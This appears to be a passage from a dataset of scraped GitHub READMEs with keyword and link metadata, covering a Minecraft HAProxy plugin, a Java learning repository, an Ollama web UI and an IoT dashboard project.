[![](https://img.shields.io/github/downloads/HaHaWTH/HAProxy-Detector/total?style=for-the-badge)](https://github.com/HaHaWTH/HAProxy-Detector/releases) [![](https://img.shields.io/github/license/HaHaWTH/HAProxy-Detector?style=for-the-badge)](https://github.com/HaHaWTH/HAProxy-Detector/blob/master/LICENSE) [![](https://img.shields.io/bstats/servers/21070?label=Spigot%20Servers&style=for-the-badge)](https://bstats.org/plugin/bukkit/HAProxyDetector/21070) [![](https://img.shields.io/bstats/servers/12605?label=BC%20Servers&style=for-the-badge)](https://bstats.org/plugin/bungeecord/HAProxyDetector/12605) [![](https://img.shields.io/bstats/servers/14442?label=Velocity%20Servers&style=for-the-badge)](https://bstats.org/plugin/velocity/HAProxyDetector/14442)

This [BungeeCord](https://github.com/SpigotMC/BungeeCord/) (and now [Spigot](https://www.spigotmc.org/wiki/spigot/)
and [Velocity](https://papermc.io/software/velocity/)) plugin enables proxied and direct connections both at the same time. More
information about [HAProxy](https://www.haproxy.org/) and its uses can be
found [here](https://github.com/MinelinkNetwork/BungeeProxy/blob/master/README.md).

**Originally made by Andylizi**

**This plugins requires Java11 or higher!**

## Security Warning

Allowing both direct and proxied connections has significant security implications — a malicious player can access the
server through their own HAProxy instance, thus tricking the server into believing the connection is coming from a
fake IP.

To counter this, this plugin implements IP whitelisting. **By default, only proxied connections from `localhost` will be
allowed** (direct connections aren't affected). You can add the IP/domain of your trusted HAProxy instance by
editing `whitelist.conf`, which can be found under the plugin data folder.

<details>
    <summary>Details of the whitelist format</summary>

```
# List of allowed proxy IPs
#
# An empty whitelist will disallow all proxies.
# Each entry must be an valid IP address, domain name or CIDR.
# Domain names will be resolved only once at startup.
# Each domain can have multiple A/AAAA records, all of them will be allowed.
# CIDR prefixes are not allowed in domain names.

127.0.0.0/8
::1/128
```

If you want to disable the whitelist (which you should never do), you can do so by
putting this line verbatim, before any other entries:

```
YesIReallyWantToDisableWhitelistItsExtremelyDangerousButIKnowWhatIAmDoing!!!
```

</details>

## Platform-specific Notes

#### BungeeCord

`proxy_protocol` needs to be enabled in BC `config.yml` for this plugin to work. (Not to be confused with the similar option in `paper.yml`)

Older versions of BC can in theory use [BungeeProxy](https://github.com/MinelinkNetwork/BungeeProxy) in parallel
with this plugin, but it hasn't been tested yet. Feedback is welcomed.

#### Spigot and its derivatives

[ProtocolLib](https://www.spigotmc.org/resources/protocollib.1997/) is a required dependency.
This plugin was developed using ProtocolLib 5.0.

#### Paper

New versions of Paper have built-in HAProxy support (proxied connection only). It's not compatible with this plugin, so please disable the `proxy-protocol` option in `paper.yml`.

#### Velocity

`haproxy-protocol` needs to be enabled in Velocity config for this plugin to work.

Versions older than 3.0 are not supported.

#### Java >= 9

**No need to use this, ImagineBreaker has already wiped it**

If errors like `NoClassDefFoundError: sun.misc.Unsafe`, `InaccessibleObjectException` and such are encountered,
please add `--add-opens java.base/java.lang.invoke=ALL-UNNAMED` to JVM arguments.

#### Java >= 18

**No need to use this, ImagineBreaker has already wiped it**

If errors like `IllegalAccessException: static final field has no write access` are encountered,
please upgrade the plugin to at least v3.0.2.

If you cannot upgrade for whatever reason, a temporary workaround would be to add
`-Djdk.reflect.useDirectMethodHandle=false` to JVM arguments.

Note that this argument will be removed in future Java releases.

## Metrics

This plugin uses [bStats](https://bStats.org) for metrics. It collects some basic information, like how many people
use this plugin and the total player count. You can opt out at any time by editing the config file under
`plugins/bStats/`.
",1,0,1,mit,0.0,"['bungeecord', 'spigot', 'velocity', 'plugin', 'enables', 'proxied', 'direct', 'connection', 'time', 'information', 'haproxy', 'us', 'found', 'originally', 'made', 'andylizi', 'plugins', 'requires', 'higher', 'security', 'warning', 'allowing', 'direct', 'proxied', 'connection', 'significant', 'security', 'implication', 'malicious', 'player', 'access', 'server', 'haproxy', 'instance', 'thus', 'tricking', 'server', 'believing', 'connection', 'coming', 'fake', 'ip', 'counter', 'plugin', 'implement', 'ip', 'whitelisting', 'default', 'proxied', 'connection', 'allowed', 'direct', 'connection', 'affected', 'add', 'trusted', 'haproxy', 'instance', 'editing', 'found', 'plugin', 'data', 'folder', 'want', 'disable', 'whitelist', 'never', 'putting', 'line', 'verbatim', 'entry', 'note', 'bungeecord', 'need', 'enabled', 'bc', 'plugin', 'work', 'confused', 'similar', 'option', 'older', 'version', 'bc', 'theory', 'use', 'bungeeproxy', 'parallel', 'plugin', 'tested', 'yet', 'feedback', 'welcomed', 'spigot', 'derivative', 'protocollib', 'required', 'dependency', 'plugin', 'developed', 'using', 'protocollib', 'paper', 'new', 'version', 'paper', 'haproxy', 'support', 'proxied', 'connection', 'compatible', 'plugin', 'please', 'disable', 'option', 'velocity', 'need', 'enabled', 'velocity', 'config', 'plugin', 'work', 'versions', 'older', 'supported', 'java', 'need', 'use', 'imaginebreaker', 'already', 'wiped', 'error', 'like', 'encountered', 'please', 'add', 'jvm', 'argument', 'java', 'need', 'use', 'imaginebreaker', 'already', 'wiped', 'error', 'like', 'encountered', 'please', 'upgrade', 'plugin', 'least', 'upgrade', 'whatever', 'reason', 'temporary', 'workaround', 'would', 'add', 'jvm', 'argument', 'note', 'argument', 'removed', 'future', 'java', 'release', 'metric', 'plugin', 'us', 'bstats', 'metric', 'collect', 'basic', 'information', 'like', 'many', 'people', 'use', 'plugin', 'total', 'player', 'count', 'opt', 'time', 'editing', 'config', 'file']","['plugin', 'connection', 'proxied', 'haproxy', 'need']",0,0,0,"['security', 'warn', 'list', 'allow', 'proxy', 'ip', 'an', 'empty', 'whitelist', 'disallow', 'proxy', 'each', 'entry', 'must', 'valid', 'ip', 'address', 'domain', 'name', 'cidr', 'domain', 'name', 'resolve', 'startup', 'each', 'domain', 'multiple', 'record', 'allow', 'cidr', 'prefix', 'allow', 'domain', 'name', 'note', 'bungeecord', 'spigot', 'derivative', 'paper', 'velocity', 'java', 'java', 'metric']",16,"['domain', 'allow', 'name', 'proxy', 'ip']",2,0.0,1.0,"[maven-compiler-plugin,maven-jar-plugin,maven-shade-plugin,maven-surefire-plugin]",0.0,1.0,0.0,4336,18.823529411764707,5.2359375,"['![ -> https://img.shields.io/github/downloads/HaHaWTH/HAProxy-Detector/total?style=for-the-badge', '![ -> https://img.shields.io/github/license/HaHaWTH/HAProxy-Detector?style=for-the-badge', '![ -> https://img.shields.io/bstats/servers/21070?label=Spigot%20Servers&style=for-the-badge', '![ -> https://img.shields.io/bstats/servers/12605?label=BC%20Servers&style=for-the-badge', '![ -> https://img.shields.io/bstats/servers/14442?label=Velocity%20Servers&style=for-the-badge', 'BungeeCord -> https://github.com/SpigotMC/BungeeCord/', 'Spigot -> https://www.spigotmc.org/wiki/spigot/', 'Velocity -> https://papermc.io/software/velocity/', 'HAProxy -> https://www.haproxy.org/', 'here -> https://github.com/MinelinkNetwork/BungeeProxy/blob/master/README.md', 'BungeeProxy -> https://github.com/MinelinkNetwork/BungeeProxy', 'ProtocolLib -> https://www.spigotmc.org/resources/protocollib.1997/', 'bStats -> https://bStats.org']",13
AkashKobal/java-full-stack-developement,main,"# java-full-stack-developement  
## 🗒️ Description     
    
This advanced-level repository equips learners with the necessary skills to excel in full-stack development using Java, with a focus on fostering employability skills. learners will delve into the key technologies integral to full-stack development, primarily centered around Java and its associated tools and frameworks such as Java EE, Java Persistence, Hibernate, Maven, and Spring Core. Upon successful completion of the repository, learners will be well-prepared to pursue a career in full-stack development, armed with a comprehensive understanding of Java-based technologies and problem-solving capabilities.

## Content's 
## Calculator _(HTML, CSS, Java)_      
![alt text](https://github.com/AkashKobal/java-full-stack-developement/blob/main/Calculator/output.png)      
 
 
## What you'll learn  
- Build a fully functioning web application through a simplistic step from a professional trainer<br>  
- Java programming language 
- Learn Java server pages, servlets, and JSTL from the basics to advance
- Understand building web forms with JSP  
- Apply validations on the forms
- Use the web template to make the web application incredible 
- Create-Deploy Servlets & Understand Servlet Lifecycle 
- Learn how to Handle Session in JSP
- Develop Dynamic Web Applications
- Learn MVC in JSP
- Forms under JSP and Servlets
- Collection
- Learn the concept related to Generics
- Add validations on form data
- Adding records into the database
- Updating record(s) into database
- Deleting record(s) into database
- Spring Framework
- Web Services – RestFul API
- Spring Boot
- Spring Boot Restful API
- JavaScript

## Repository Overview
### Java Fundamentals

- Explore the intricacies of decision-making in Java.
- Master object-oriented programming concepts for efficient code organization.
- Dive into the powerful Collections framework and debugging techniques.
- Harness the flexibility of Generics for enhanced code reusability.
- Conquer the complexities of multi-threading and understand Lambdas for concise, functional programming.
- Gain proficiency in file handling to manage data seamlessly.

### Web Development with JSP and Servlets

- Learn to build interactive web forms using JSP.
- Implement form validations for a seamless user experience.
- Develop and deploy Java Servlets for dynamic web applications.
- Understand session management in JSP for enhanced user interactions.
- Explore database integration: add, update, and delete records effortlessly.
- Master the art of image and file uploads for versatile web applications.

### Hibernate for Database Operations

- Establish a robust connection between Hibernate and databases.
- Delve into Hibernate Query Language (HQL) basics.
- Perform CRUD operations seamlessly with Hibernate.

### Spring Framework & REST API Overview

- Grasp the concept of Inversion of Control (IoC) for flexible application architecture.
- Dive into Spring Beans for modular and scalable development.
- Utilize resource-based URIs for CRUD methods and handle JSON responses.
- Implement HATEOAS principles for resource discoverability.
- Ensure the idempotence of HTTP methods for robust APIs.

### Spring Boot Mastery

- Navigate the seamless transition from Spring Boot 2.7 to Spring Boot 3 migrations.
- Enhance your applications by integrating Spring Security, Thymeleaf tags, and Restful APIs into Spring Boot projects.
- Implement validations in the Register Form and introduce a sleek Profile page on the Blog application.
- Incorporate user account support to elevate your Spring applications.
- Implement JWT token generation for secure authentication.
- Integrate the H2 database seamlessly.
- Explore web template integration for polished user interfaces.
- Strengthen application security with Spring Security and Bcrypt password hashing.
- Develop functionalities like profile updates and password reset emails.

### JavaScript
- Master keywords and data types in JavaScript.
- Differentiate between normal functions and expression functions.
- Harness the power of forEach method for efficient array processing.
- Gain proficiency in DOM manipulation and understand callback functions.

### JUnit :
- Gain a solid understanding of the fundamentals of the JUnit testing framework.
- Learn how to structure and implement effective JUnit test methods for robust and reliable testing.
- Explore techniques for testing exceptions, ensuring your code handles unexpected scenarios seamlessly.

### Micro-Web Services and JSTL:
- Dive into the legacy content of micro-web services, exploring both basic and advanced concepts.
- Master the intricacies of JavaServer Pages Standard Tag Library (JSTL) for efficient web development.

### Bonus Modules:
- Explore Docker and WSL on Windows for containerized development.
- Implement OAuth2 with JWT token generation for secure authentication.
- Develop Album API with Spring Boot.

### Key Learning Objectives
- Java Fundamentals: Master core Java concepts, including multi-threading, Lambdas, Collections framework, and file handling.
- Hibernate: Explore Hibernate, learn to build applications using JSP and Hibernate, and perform CRUD operations.
- Spring Framework: Dive into the Spring framework, covering Inversion of Control, Dependency Injection, and more.
- Spring Boot: Gain in-depth knowledge of Spring Boot, covering migrations, security integration, Thymeleaf tags, and Restful API implementation.
- JavaScript Basics: Understand essential JavaScript concepts, including objects, loops, decision-making, array methods, and asynchronous JavaScript.

### Repository Features
- Understand the end-to-end process of building web forms with JSP and Servlets.
- Acquire a strong foundation in object-oriented programming, covering core concepts, method parameters, return types, arrays, collections, and debugging.
- Implement sessions in JSP for efficient web application management.
- Apply a wide range of concepts to projects, allowing you to practice and reinforce your new skills.

This README serves as a comprehensive guide for learners enrolled in the repository, outlining the curriculum's objectives, technologies covered, and skills developed throughout the program.
",1,0,23,mit,23.0,"['description', 'repository', 'equips', 'learner', 'necessary', 'skill', 'excel', 'development', 'using', 'java', 'focus', 'fostering', 'employability', 'skill', 'learner', 'delve', 'key', 'technology', 'integral', 'development', 'primarily', 'centered', 'around', 'java', 'associated', 'tool', 'framework', 'java', 'ee', 'java', 'persistence', 'hibernate', 'maven', 'spring', 'core', 'upon', 'successful', 'completion', 'repository', 'learner', 'pursue', 'career', 'development', 'armed', 'comprehensive', 'understanding', 'technology', 'capability', 'content', 'calculator', 'html', 'cs', 'java', 'learn', 'build', 'fully', 'functioning', 'web', 'application', 'simplistic', 'step', 'professional', 'trainer', 'java', 'programming', 'language', 'learn', 'java', 'server', 'page', 'servlets', 'jstl', 'basic', 'advance', 'understand', 'building', 'web', 'form', 'jsp', 'apply', 'validation', 'form', 'use', 'web', 'template', 'make', 'web', 'application', 'incredible', 'servlets', 'understand', 'servlet', 'lifecycle', 'learn', 'handle', 'session', 'jsp', 'develop', 'dynamic', 'web', 'application', 'learn', 'mvc', 'jsp', 'form', 'jsp', 'servlets', 'collection', 'learn', 'concept', 'related', 'generic', 'add', 'validation', 'form', 'data', 'adding', 'record', 'database', 'updating', 'record', 'database', 'deleting', 'record', 'database', 'spring', 'framework', 'web', 'service', 'restful', 'api', 'spring', 'boot', 'spring', 'boot', 'restful', 'api', 'javascript', 'repository', 'overview', 'java', 'fundamental', 'explore', 'intricacy', 'java', 'master', 'programming', 'concept', 'efficient', 'code', 'organization', 'dive', 'powerful', 'collection', 'framework', 'debugging', 'technique', 'harness', 'flexibility', 'generic', 'enhanced', 'code', 'reusability', 'conquer', 'complexity', 'understand', 'lambda', 'concise', 'functional', 'programming', 'gain', 'proficiency', 'file', 'handling', 'manage', 'data', 'seamlessly', 'web', 'development', 'jsp', 'servlets', 'learn', 'build', 'interactive', 'web', 'form', 'using', 'jsp', 'implement', 'form', 'validation', 'seamless', 'user', 'experience', 'develop', 'deploy', 'java', 'servlets', 'dynamic', 'web', 'application', 'understand', 'session', 'management', 'jsp', 'enhanced', 'user', 'interaction', 'explore', 'database', 'integration', 'add', 'update', 'delete', 'record', 'effortlessly', 'master', 'art', 'image', 'file', 'uploads', 'versatile', 'web', 'application', 'hibernate', 'database', 'operation', 'establish', 'robust', 'connection', 'hibernate', 'database', 'delve', 'hibernate', 'query', 'language', 'hql', 'basic', 'perform', 'crud', 'operation', 'seamlessly', 'hibernate', 'spring', 'framework', 'rest', 'api', 'overview', 'grasp', 'concept', 'inversion', 'control', 'ioc', 'flexible', 'application', 'architecture', 'dive', 'spring', 'bean', 'modular', 'scalable', 'development', 'utilize', 'uris', 'crud', 'method', 'handle', 'json', 'response', 'implement', 'hateoas', 'principle', 'resource', 'discoverability', 'ensure', 'idempotence', 'http', 'method', 'robust', 'apis', 'spring', 'boot', 'mastery', 'navigate', 'seamless', 'transition', 'spring', 'boot', 'spring', 'boot', 'migration', 'enhance', 'application', 'integrating', 'spring', 'security', 'thymeleaf', 'tag', 'restful', 'apis', 'spring', 'boot', 'project', 'implement', 'validation', 'register', 'form', 'introduce', 'sleek', 'profile', 'page', 'blog', 'application', 'incorporate', 'user', 'account', 'support', 'elevate', 'spring', 'application', 'implement', 'jwt', 'token', 'generation', 'secure', 'authentication', 'integrate', 'database', 'seamlessly', 'explore', 'web', 'template', 'integration', 'polished', 'user', 'interface', 'strengthen', 'application', 'security', 'spring', 'security', 'bcrypt', 'password', 'hashing', 'develop', 'functionality', 'like', 'profile', 'update', 'password', 'reset', 'email', 'javascript', 'master', 'keywords', 'data', 'type', 'javascript', 'differentiate', 'normal', 'function', 'expression', 'function', 'harness', 'power', 'foreach', 'method', 'efficient', 'array', 'processing', 'gain', 'proficiency', 'dom', 'manipulation', 'understand', 'callback', 'function', 'junit', 'gain', 'solid', 'understanding', 'fundamental', 'junit', 'testing', 'framework', 'learn', 'structure', 'implement', 'effective', 'junit', 'test', 'method', 'robust', 'reliable', 'testing', 'explore', 'technique', 'testing', 'exception', 'ensuring', 'code', 'handle', 'unexpected', 'scenario', 'seamlessly', 'service', 'jstl', 'dive', 'legacy', 'content', 'service', 'exploring', 'basic', 'advanced', 'concept', 'master', 'intricacy', 'javaserver', 'page', 'standard', 'tag', 'library', 'jstl', 'efficient', 'web', 'development', 'bonus', 'module', 'explore', 'docker', 'wsl', 'window', 'containerized', 'development', 'implement', 'jwt', 'token', 'generation', 'secure', 'authentication', 'develop', 'album', 'api', 'spring', 'boot', 'key', 'learning', 'objective', 'java', 'fundamental', 'master', 'core', 'java', 'concept', 'including', 'lambda', 'collection', 'framework', 'file', 'handling', 'hibernate', 'explore', 'hibernate', 'learn', 'build', 'application', 'using', 'jsp', 'hibernate', 'perform', 'crud', 'operation', 'spring', 'framework', 'dive', 'spring', 'framework', 'covering', 'inversion', 'control', 'dependency', 'injection', 'spring', 'boot', 'gain', 'knowledge', 'spring', 'boot', 'covering', 'migration', 'security', 'integration', 'thymeleaf', 'tag', 'restful', 'api', 'implementation', 'javascript', 'basic', 'understand', 'essential', 'javascript', 'concept', 'including', 'object', 'loop', 'array', 'method', 'asynchronous', 'javascript', 'repository', 'feature', 'understand', 'process', 'building', 'web', 'form', 'jsp', 'servlets', 'acquire', 'strong', 'foundation', 'programming', 'covering', 'core', 'concept', 'method', 'parameter', 'return', 'type', 'array', 'collection', 'debugging', 'implement', 'session', 'jsp', 'efficient', 'web', 'application', 'management', 'apply', 'wide', 'range', 'concept', 'project', 'allowing', 'practice', 'reinforce', 'new', 'skill', 'readme', 'serf', 'comprehensive', 'guide', 'learner', 'enrolled', 'repository', 'outlining', 'curriculum', 'objective', 'technology', 'covered', 'skill', 'developed', 'throughout', 'program']","['spring', 'web', 'java', 'application', 'jsp']",0,0,0,"['description', 'content', 'calculator', 'html', 'cs', 'java', 'what', 'learn', 'repository', 'overview', 'java', 'fundamental', 'web', 'development', 'jsp', 'servlets', 'hibernate', 'database', 'operation', 'spring', 'framework', 'rest', 'api', 'overview', 'spring', 'boot', 'mastery', 'javascript', 'junit', 'service', 'jstl', 'bonus', 'module', 'key', 'learning', 'objective', 'repository', 'feature']",17,"['java', 'repository', 'overview', 'spring', 'description']",0,0.0,2.0,[],0.0,2.0,0.0,6260,15.254545454545454,5.98927294398093,['alt text -> https://github.com/AkashKobal/java-full-stack-developement/blob/main/Calculator/output.png'],1
ollama4j/ollama4j-web-ui,main,"# Ollama4j Web UI

A web UI for [Ollama](https://ollama.com/) written in Java
using [Spring Boot](https://spring.io/projects/spring-boot/) and [Vaadin](https://vaadin.com/) framework
and [Ollama4j](https://github.com/amithkoujalgi/ollama4j).

The goal of the project is to enable Ollama users coming from Java and Spring background to have a fully functional web
UI.

This project focuses on the raw capabilities of interacting with various models running on Ollama servers.

## Table of Contents

- [How does it work?](#how-does-it-work)
- [Requirements](#requirements)
- [Run the app](#running-the-application)
- [Screenshots](#screenshots)
- [Dev Contributions](#get-involved)

#### How does it work?

```mermaid
  flowchart LR
    owui[Ollama4j Web UI]
    o4j[Ollama4j]
    o[Ollama Server]
    owui -->|uses| o4j
    o4j -->|Communicates with| o;
    m[Models]
    subgraph Ollama Deployment
        direction TB
        o -->|Manages| m
    end
```

#### Requirements

![Java](https://img.shields.io/badge/Java-17_+-blue.svg?style=just-the-message&labelColor=gray)

## Running the application

### Download

Download the latest version from [here](https://github.com/ollama4j/ollama4j-web-ui/releases).

Or, you could download it via command-line.
Just make sure to specify the version you want to download.

```shell
VERSION=0.0.1; wget https://github.com/ollama4j/ollama4j-web-ui/releases/download/$VERSION/ollama4j-web-ui-$VERSION.jar
```

### Configure

Create a file `application.properties` and add the following configuration.
Update the values of `server.port` and `ollama.url` according to your needs.

```shell
server.port=8080
logging.level.org.atmosphere = warn

spring.mustache.check-template-location = false
spring.servlet.multipart.max-file-size=50MB
spring.servlet.multipart.max-request-size=50MB

vaadin.launch-browser=true
vaadin.whitelisted-packages = com.vaadin,org.vaadin,dev.hilla,io.github.ollama4j

ollama.url=http://localhost:11434
ollama.request-timeout-seconds=120
```

### Run the app

```shell
java -jar ollama4j-web-ui-$VERSION.jar \
  --spring.config.location=/path/to/your/application.properties
```

Then open http://localhost:8080 in your browser to access the Ollama4j Web UI.

### Screenshots

<img width=""2048"" alt=""Chat"" src=""https://github.com/ollama4j/ollama4j-web-ui/assets/1876165/426c7ab7-2a27-4bae-87db-daa6a499395c"">
<img width=""2048"" alt=""Image Chat"" src=""https://github.com/ollama4j/ollama4j-web-ui/assets/1876165/1ac899bc-a19e-4dc0-bee1-63b67e8fb346"">
<img width=""2048"" alt=""Models"" src=""https://github.com/ollama4j/ollama4j-web-ui/assets/1876165/c697fd1d-0323-4351-b9a7-25166eff4c7e"">

### Improvements

[ ] - Show errors on the UI. For example,
`io.github.ollama4j.exceptions.OllamaBaseException: model ""llama3"" not found, try pulling it first`.

[ ] - Settings pane for configuring default params such as `top-p`, `top-k`, etc.

### Get Involved

Contributions are most welcome! Whether it's reporting a bug, proposing an enhancement, or helping
with code - any sort
of contribution is much appreciated.

### Credits

The project is inspired by the awesome [ollama4j-ui](https://github.com/AgentSchmecker/ollama4j-ui) project
by [@AgentSchmecker](https://github.com/AgentSchmecker).

The nomenclature has been adopted from the incredible [Ollama](https://ollama.ai/)
project.
",1,2,1,mit,2.0,"['web', 'ui', 'web', 'ui', 'ollama', 'written', 'java', 'using', 'spring', 'boot', 'vaadin', 'framework', 'goal', 'project', 'enable', 'ollama', 'user', 'coming', 'java', 'spring', 'background', 'fully', 'functional', 'web', 'ui', 'project', 'focus', 'raw', 'capability', 'interacting', 'various', 'model', 'running', 'ollama', 'server', 'table', 'content', 'work', 'requirements', 'run', 'app', 'screenshots', 'dev', 'contribution', 'work', 'requirements', 'running', 'application', 'download', 'download', 'latest', 'version', 'could', 'download', 'via', 'make', 'sure', 'specify', 'version', 'want', 'download', 'configure', 'create', 'file', 'add', 'following', 'configuration', 'update', 'value', 'according', 'need', 'run', 'app', 'open', 'http', 'browser', 'access', 'web', 'ui', 'screenshots', 'improvement', 'show', 'error', 'ui', 'example', 'setting', 'pane', 'configuring', 'default', 'params', 'etc', 'get', 'involved', 'contribution', 'welcome', 'whether', 'reporting', 'bug', 'proposing', 'enhancement', 'helping', 'code', 'sort', 'contribution', 'much', 'appreciated', 'credit', 'project', 'inspired', 'awesome', 'project', 'agentschmecker', 'nomenclature', 'adopted', 'incredible', 'ollama', 'project']","['ui', 'project', 'web', 'ollama', 'download']",1,0,0,"['web', 'ui', 'table', 'content', 'how', 'work', 'requirement', 'run', 'application', 'download', 'configure', 'run', 'app', 'screenshots', 'improvement', 'get', 'involved', 'credit']",12,"['run', 'web', 'ui', 'table', 'content']",4,0.0,1.0,"[com.vaadin:vaadin-maven-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,3335,25.210526315789476,5.196242171189979,"['Ollama -> https://ollama.com/', 'Spring Boot -> https://spring.io/projects/spring-boot/', 'Vaadin -> https://vaadin.com/', 'Ollama4j -> https://github.com/amithkoujalgi/ollama4j', 'Java -> https://img.shields.io/badge/Java-17_+-blue.svg?style=just-the-message&labelColor=gray', 'here -> https://github.com/ollama4j/ollama4j-web-ui/releases', 'ollama4j-ui -> https://github.com/AgentSchmecker/ollama4j-ui', '@AgentSchmecker -> https://github.com/AgentSchmecker', 'Ollama -> https://ollama.ai/', 'Ollama4j Web UI', 'Ollama4j', 'Ollama Server', 'Models', ' ', ' ']",15
blumek/aura-tower,master,"[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE) </br>
![Nginx](https://img.shields.io/badge/Nginx-009639?style=for-the-badge&logo=nginx&logoColor=white)
![Node.js](https://img.shields.io/badge/Node%20js-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)
![npm](https://img.shields.io/badge/npm-CB3837?style=for-the-badge&logo=npm&logoColor=white)
![TypeScript](https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white)
![Angular](https://img.shields.io/badge/Angular-DD0031?style=for-the-badge&logo=angular&logoColor=white) </br>
![Docker](https://img.shields.io/badge/Docker-2CA5E0?style=for-the-badge&logo=docker&logoColor=white)
![Apache Maven](https://img.shields.io/badge/apache_maven-C71A36?style=for-the-badge&logo=apachemaven&logoColor=white)
![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
![Spring Boot](https://img.shields.io/badge/Spring_Boot-F2F4F9?style=for-the-badge&logo=spring-boot)
![Swagger](https://img.shields.io/badge/Swagger-85EA2D?style=for-the-badge&logo=Swagger&logoColor=white)
![Junit5](https://img.shields.io/badge/Junit5-25A162?style=for-the-badge&logo=junit5&logoColor=white)



# 🛫 Aura Tower

![Aura Tower logo](frontend/src/assets/images/logo-full.png)

Aura Tower is an open-source project designed to control and monitor IoT devices through an intuitive dashboard. The
project is highly extensible, allowing users to enhance its functionality with custom device drivers. This README
provides an overview of the project, milestones, and guidelines on how to contribute.

## 📖 Table of Contents

- [📢 Introduction](#-introduction)
- [✨ Features](#-features)
- [🎯 Milestones](#-milestones)
- [💿 Installation](#-installation)
- [😎 Usage](#-usage)
- [🛠️ Contributing](#-contributing)
- [🎖️ License](#-license)

## 📢 Introduction

Aura Tower aims to simplify the management of IoT devices, providing a centralized platform for controlling and
monitoring various devices. The project is built with flexibility in mind, enabling developers to create custom drivers
and expand the system's capabilities.

<a href=""https://www.youtube.com/watch?v=vA4TfWpt0PY""><img src=""frontend/src/assets/images/youtube-thumbnail.png"" alt=""Aura Tower Trailer"" width=""282"" height=""195""></a>

## ✨ Features

- **Dashboard for IoT device management**
- **User authentication system**
- **Places management**
- **Device metrics presentation**
- **Custom device drivers development**

## 🎯 Milestones

1. ~~**User Authentication**~~
    - ~~Register user~~
    - ~~Login~~
    - ~~Remind password~~
    - ~~Refresh token~~
    - ~~Authentication with access token~~
    - ~~Views implementation~~

2. ~~**Places Management**~~
    - ~~Create place~~
    - ~~Delete place~~
    - ~~Update place~~
    - ~~View implementation~~

3. ~~**Metrics Presentation**~~
    - ~~Querying~~
    - ~~WebSockets~~
    - ~~View implementation~~

4. ~~**Application Introduction**~~
    - ~~Views implementation~~

5. ~~**Application Settings**~~
    - ~~Account security settings~~
    - ~~Color scheme modes selection~~
    - ~~Development information~~

6. ~~**Device Simulators**~~
    - ~~Light bulb simulator over HTTP~~
    - ~~Thermometer simulator over HTTP~~

7. **Device Metrics View Creator**
    - Driver, device, type to use
    - Selection of data to display

8. **Areas Inside Places**
    - Grouping devices together for bulk management

9. **Application Optimizations and Technical Debt Pay down**
    - Performance improvements
    - Codebase refactoring

## 💿 Installation

> [!NOTE]
> Docker is required.

1. Clone the repository:
    ```bash
    git clone https://github.com/blumek/aura-tower.git
    ```

2. Navigate to the project directory:
    ```bash
    cd aura-tower
    ```

3. Pull docker containers:
    ```bash
    docker compose pull
    ```

4. Build docker containers:
    ```bash
    docker compose build
    ```

5. Start docker containers:
    ```bash
    docker compose up -d
    ```

## 😎 Usage

After starting the development server, open your browser and navigate to `http://localhost:4201`. From the dashboard,
you can register a new account, log in, and start managing your IoT devices. Use the settings to customize your
experience and explore the various features offered by Aura Tower.

![Aura Tower screen](frontend/src/assets/images/aura-screenshot.png)

## 🛠️ Contributing

Aura Tower is open to contributions from the community. To contribute:

1. Fork the repository on GitHub.
2. Create a new branch for your feature or bugfix.
3. Make your changes and commit them with descriptive messages.
4. Push your changes to your forked repository.
5. Open a pull request on the main repository.

Please ensure your code adheres to the project's coding standards and includes appropriate tests.

## 🎖️ License

Aura Tower is open-source software licensed under the [MIT License](LICENSE). You are free to use, modify, and
distribute this software as long as you comply with the license terms.

---

Thank you for being a part of the Aura Tower community! Together, we can build a powerful and flexible platform for IoT
device management.
",0,0,1,mit,0.0,"['aura', 'tower', 'aura', 'tower', 'project', 'designed', 'control', 'monitor', 'iot', 'device', 'intuitive', 'dashboard', 'project', 'highly', 'extensible', 'allowing', 'user', 'enhance', 'functionality', 'custom', 'device', 'driver', 'readme', 'provides', 'overview', 'project', 'milestone', 'guideline', 'contribute', 'table', 'content', 'introduction', 'feature', 'milestone', 'installation', 'usage', 'contributing', 'license', 'introduction', 'aura', 'tower', 'aim', 'simplify', 'management', 'iot', 'device', 'providing', 'centralized', 'platform', 'controlling', 'monitoring', 'various', 'device', 'project', 'built', 'flexibility', 'mind', 'enabling', 'developer', 'create', 'custom', 'driver', 'expand', 'system', 'capability', 'feature', 'dashboard', 'iot', 'device', 'management', 'user', 'authentication', 'system', 'place', 'management', 'device', 'metric', 'presentation', 'custom', 'device', 'driver', 'development', 'milestone', 'user', 'authentication', 'access', 'place', 'management', 'metric', 'presentation', 'application', 'introduction', 'application', 'setting', 'security', 'scheme', 'mode', 'device', 'simulator', 'bulb', 'simulator', 'simulator', 'device', 'metric', 'view', 'creator', 'driver', 'device', 'type', 'use', 'selection', 'data', 'display', 'area', 'inside', 'place', 'grouping', 'device', 'together', 'bulk', 'management', 'application', 'optimization', 'technical', 'debt', 'pay', 'performance', 'improvement', 'codebase', 'refactoring', 'installation', 'note', 'docker', 'required', 'clone', 'repository', 'navigate', 'project', 'directory', 'pull', 'docker', 'container', 'build', 'docker', 'container', 'start', 'docker', 'container', 'usage', 'starting', 'development', 'server', 'open', 'browser', 'navigate', 'dashboard', 'register', 'new', 'account', 'log', 'start', 'managing', 'iot', 'device', 'use', 'setting', 'customize', 'experience', 'explore', 'various', 'feature', 'offered', 'aura', 'tower', 'contributing', 'aura', 'tower', 'open', 'contribution', 'community', 'contribute', 'fork', 'repository', 'github', 'create', 'new', 'branch', 'feature', 'bugfix', 'make', 'change', 'commit', 'descriptive', 'message', 'push', 'change', 'forked', 'repository', 'open', 'pull', 'request', 'main', 'repository', 'please', 'ensure', 'code', 'adheres', 'project', 'coding', 'standard', 'includes', 'appropriate', 'test', 'license', 'aura', 'tower', 'software', 'licensed', 'mit', 'license', 'free', 'use', 'modify', 'distribute', 'software', 'long', 'comply', 'license', 'term', 'thank', 'part', 'aura', 'tower', 'community', 'together', 'build', 'powerful', 'flexible', 'platform', 'iot', 'device', 'management']","['device', 'aura', 'tower', 'project', 'management']",0,0,0,"['aura', 'tower', 'table', 'content', 'introduction', 'feature', 'milestone', 'installation', 'usage', 'contribute', 'license']",9,"['aura', 'tower', 'table', 'content', 